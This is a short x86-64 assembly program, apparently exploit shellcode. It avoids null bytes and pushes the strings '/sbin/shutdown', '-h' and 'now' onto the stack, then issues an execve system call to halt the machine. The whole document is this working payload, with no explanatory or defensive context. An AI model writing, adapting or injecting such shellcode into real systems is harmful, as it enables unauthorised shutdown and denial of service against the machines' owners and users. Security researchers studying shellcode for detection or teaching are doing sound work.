section .text

global _start

_start:

xor rax, rax
cdq

push rdx
push byte 0x77
push word 0x6f6e ; now
mov rbx, rsp

push rdx
push word 0x682d ;-h
mov rcx, rsp

push rdx
mov rdi, 0x2f2f2f6e6962732f ; /sbin/shutdown
mov rsi, 0x6e776f6474756873
push rsi
push rdi
mov rdi, rsp

push rax
push rbx
push rcx
push rdi
mov rsi, rsp

sub rax, 0xffffffc5
syscall
